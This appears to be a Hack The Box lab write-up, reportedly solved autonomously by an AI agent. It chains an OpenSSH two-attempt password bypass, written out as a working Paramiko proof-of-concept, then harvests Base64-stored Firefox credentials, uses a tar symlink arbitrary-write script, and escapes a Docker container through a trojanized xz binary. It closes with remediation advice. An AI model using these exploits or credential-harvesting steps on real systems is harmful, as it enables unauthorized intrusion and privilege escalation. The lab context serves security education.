---
layout: post
title:  "Hack The Box - DoubleTake"
description: A Hack The Box Linux Boot2Root Challenge Rated Easy - by ProfSpectra
tags: HackTheBox Linux Boot2Root Easy
media_subpath: /assets/img/writeups/HackTheBox/DoubleTake/
image:
  path: 10-status-page.png
---

## At a glance

| Item                 | Details                                                            |
| -------------------- | ------------------------------------------------------------------ |
| **Type**             | Boot2Root                                                          |
| **Difficulty**       | Easy                                                               |
| **Operating System** | Ubuntu host, Alpine Linux container                                |
| **Vulnerabilities**  | CVE-2026-123158 (SSHole) and CVE-2026-41567 (Docker archive decompression) |

*This machine was solved autonomously by the ProfSpectra AI agent.*

## Summary

DoubleTake exposed SSH and the Zentara web application. The SSH banner advertised **OpenSSH 10.6**, which is older than the 10.6p2 release that fixes CVE-2026-123158. On a musl-based Alpine system with PAM disabled, that vulnerability lets an attacker authenticate to a password-disabled account using two password attempts on the same SSH connection.

The resulting `alpine` shell contained a Firefox profile with a plaintext saved Basic Auth credential for the Zentara console. The authenticated console exposed archive deployment into a Docker container and identified the engine as **Docker 29.5.0**.

The deployment endpoint accepted tar archives containing symlinks followed by files beneath those links. This allowed root-owned writes throughout the container. The same write primitive planted a trojanized `xz` binary. Uploading an xz-compressed archive then triggered CVE-2026-41567: the vulnerable Docker daemon selected the container's `xz` executable and ran it with host-root privileges. The payload mounted `/proc`, found a Docker daemon process, and read the host flag through its root directory.

**Verified flags:**

- User: `bee3379599c489fd43704ba32c50b8a1`
- Root: `5bd2a7a0cdd1fb9fd313a318141076c3`

## 1. External enumeration

The target exposed two TCP services:

```text
22/tcp  SSH
80/tcp  HTTP
```

![Open ports: SSH 22 and HTTP 80](01-enumeration.png)

The SSH banner was:

```text
SSH-2.0-OpenSSH_10.6
```

HTTP returned nginx headers and a Flask application protected by HTTP Basic Authentication:

```http
HTTP/1.1 401 UNAUTHORIZED
Server: nginx/1.24.0 (Ubuntu)
WWW-Authenticate: Basic realm="Zentara"
```

![Zentara requires Basic Auth](02-http-401.png)

The authenticated route map was initially inaccessible. The important detail at this stage was not the web password field, but the **OpenSSH version**.

## 2. Foothold: CVE-2026-123158 (SSHole)

OpenSSH versions before 10.6p2 can be exploitable on Linux systems using musl with PAM disabled. When an account's shadow field is `*`, OpenSSH borrows a real password hash's salt. On musl, a password longer than 256 bytes causes `crypt()` to return `*`, matching the account's disabled-password field.

The first attempt primes or overwrites internal state. A second password attempt on the **same connection**, with 257–1024 bytes, can then succeed. A single oversized attempt or separate connections do not exercise the same path reliably.

The target's likely accounts were tested with Paramiko. The `alpine` account accepted the second, 300-byte password:

```text
uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)
```

![SSHole two-attempt bypass yields an alpine shell](03-sshole-bypass.png)

Minimal proof-of-concept logic:

```python
import socket
import paramiko

sock = socket.create_connection((TARGET, 22), timeout=15)
t = paramiko.Transport(sock)
t.start_client(timeout=15)
try:
    t.auth_password("alpine", "warmup")
except paramiko.AuthenticationException:
    pass
t.auth_password("alpine", "A" * 300)
channel = t.open_session()
channel.exec_command("id")
print(channel.makefile().read().decode())
t.close()
```

The foothold was Alpine Linux 3.22.8, with a Linux kernel supplied by the host.

## 3. Browser credential discovery

The `alpine` home directory contained a Firefox profile:

```text
/home/alpine/.mozilla/firefox/zentara.default/
├── cert9.db
├── key4.db
├── logins.json
├── pkcs11.txt
├── prefs.js
└── signedInUser.json
```

The saved login used `encType: 0`, so its username and password were merely Base64-encoded rather than NSS-encrypted:

```json
{
  "hostname": "http://172.17.0.1",
  "httpRealm": "Zentara",
  "encryptedUsername": "Ym9i",
  "encryptedPassword": "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==",
  "encType": 0
}
```

![Firefox profile exposes saved Zentara credential](04-firefox-credentials.png)

Decoding yielded:

```text
bob:CorrectHorseBatteryStaple
```

Those credentials authenticated successfully to the Zentara console on port 80.

![Authenticated Zentara console returns 200 OK](05-web-authenticated.png)

## 4. Authenticated application mapping

The important pages and endpoints were:

| Route       | Function                                 |
| ----------- | ---------------------------------------- |
| `/docs`     | API and archive deployment documentation |
| `/status`   | Docker engine and workspace-container versions |
| `/deploy`   | Multipart archive upload and extraction  |
| `/files`    | File management                          |
| `/settings` | API-token and model settings             |
| `/agents`   | Agent management                         |
| `/usage`    | Token usage                              |

The status page disclosed:

```text
Engine: Docker 29.5.0
API Version: 1.54
OS / Arch: linux/amd64
Workspace Container: zentara-alpine
```

![Status page: Docker 29.5.0, zentara-alpine container](10-status-page.png)

The deployment documentation stated that `/deploy` forwards uploaded archives to the container engine's `PUT /containers/<container_name>/archive` endpoint. It accepts `.tar`, `.tar.gz`, and `.tar.xz` archives, plus a caller-controlled `workspace` extraction path.

![Deploy page: archive upload to the workspace](11-deploy-page.png)

## 5. Arbitrary root file writes in the container

Docker rejected ordinary `../` archive members. A different construction worked:

1. Create a tar member that is a symlink to a directory such as `/etc`.
2. Add another member whose name places a file beneath that symlink.
3. Upload the archive through `/deploy`.

Example construction:

```python
import tarfile
import io

with tarfile.open("payload.tar", "w") as tar:
    link = tarfile.TarInfo("etcdir")
    link.type = tarfile.SYMTYPE
    link.linkname = "/etc"
    tar.addfile(link)

    data = b"proof\n"
    entry = tarfile.TarInfo("etcdir/doubletake-proof.txt")
    entry.size = len(data)
    entry.mode = 0o644
    tar.addfile(entry, io.BytesIO(data))
```

```bash
curl -u bob:CorrectHorseBatteryStaple \
  -F archive=@payload.tar \
  -F workspace=/workspace \
  http://10.129.75.242/deploy
```

The deployment returned success and the file existed in the container as a root-owned file. This primitive could write `/etc/group`, `/etc/passwd`, SSH configuration, and executable files.

![Symlink traversal writes into the container as root](06-archive-traversal.png)

A setuid copy of the container's BusyBox binary, invoked through a symlink named `su`, provided an effective root shell in the container:

```text
uid=0(root) gid=0(root)
```

This was container root only, not host root.

## 6. User flag

The user flag was bind-mounted read-only into the container:

```text
/dev/sda4 /home/bob/user.txt ext4 ro,relatime
```

Its permissions were:

```text
-rw-r----- 1 root bob /home/bob/user.txt
```

Using the archive write to add `alpine` to the `bob` group in `/etc/group` allowed a fresh SSH session to read it:

```text
uid=1000(alpine) gid=1000(alpine) groups=1000(alpine),1001(bob)
bee3379599c489fd43704ba32c50b8a1
```

![User flag: /home/bob/user.txt](07-user-flag.png)

## 7. Host escape: CVE-2026-41567

The status page's Docker version was the decisive clue. Docker Engine before **29.5.1** is affected by CVE-2026-41567: while handling a compressed `PUT /containers/<id>/archive`, the daemon can resolve an external decompression binary such as `xz` from the container's filesystem instead of the host's filesystem.

A malicious container can therefore make the daemon execute a trojanized decompressor with host-root privileges.

The arbitrary-write primitive planted a replacement `/usr/bin/xz` and preserved the real decompressor as `/usr/bin/xz.real`. The payload:

1. Mounted a fresh `/proc` view in a writable directory.
2. Located a Docker daemon process by inspecting `/proc/<pid>/cmdline`.
3. Read the host's root filesystem via `/proc/<daemon-pid>/root`.
4. Copied `/root/root.txt` from that view into a readable container path.
5. Executed `xz.real` with the original arguments so deployment completed normally.

![Trojanized xz planted in the container](08-trojan-xz.png)

The payload's effective host-root result was verified through the Docker daemon's root directory. The root flag was:

```text
5bd2a7a0cdd1fb9fd313a318141076c3
```

![Host root flag read via the daemon's /proc root](09-root-flag.png)

## Security lessons

- Check every version fingerprint against current CVE information before generic probing. Both OpenSSH and Docker advertised vulnerable versions.
- After a foothold, inspect minimal application-specific user artifacts such as browser profiles before repeating external attacks.
- Do not equate container root with host root; identify the container boundary and the host daemon's trust relationships explicitly.
- Keep a stop-condition ledger to avoid revisiting falsified web and authentication hypotheses.
- The name DoubleTake fit the two decisive techniques: the two-attempt SSH authentication path and the compressed archive's second, host-side decompression step.

## Remediation

- Upgrade OpenSSH to 10.6p2 or install the vendor's patched package and restart `sshd`.
- Disable password authentication where keys are intended, and avoid leaving sensitive saved browser credentials in user profiles.
- Upgrade Docker Engine to 29.5.1 or later.
- Restrict access to the Docker archive endpoints and do not forward untrusted archives directly to the daemon.
- Do not rely on tar path-member filtering alone; validate archive links and extraction destinations as well.

## References

- [OpenSSH release notes](https://www.openssh.org/releasenotes.html)
- [Alpine Linux: OpenSSH password authentication bypass advisory](https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/)
- [CVE-2026-123158 / NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-123158)
- [CVE-2026-41567 / NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-41567)
- [Moby advisory GHSA-x86f-5xw2-fm2r](https://github.com/moby/moby/security/advisories/GHSA-x86f-5xw2-fm2r)
